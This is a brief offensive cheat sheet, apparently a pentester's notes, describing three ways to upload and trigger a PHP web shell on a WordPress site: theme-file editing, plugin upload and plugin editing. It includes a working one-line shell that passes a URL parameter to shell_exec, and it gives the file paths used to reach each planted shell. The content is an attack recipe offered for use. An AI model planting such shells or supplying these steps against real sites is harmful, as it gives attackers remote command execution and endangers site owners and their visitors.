# http wordpress shell upload --> 3 Methods to upload a shell and trigger it

## 1) Theme Editor

Dashboard > Appearance > Themes > & Edit Theme file like 404.php

trigger: wp-content/themes/<ThemeName>/404.php       Themname is sthm like twentyseventeen or twentyfifteen

```
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```


## 2) Plugins Upload

Dashboard > Plugins > Add Plugin - Upload Plugin > Choose File and click Install now button  -> ignore error message (package could not be installed bad format unable to find end of central dir record signature)

trigger: Path is shown under Media > Library > File  --> wp-content/uploads/Year/Month/shell.php

## 3) Edit Plugin

e.g akismet plugin

trigger: wp-content/plugins/akismet/akismet.php
tags: #wget #ftp #linux 
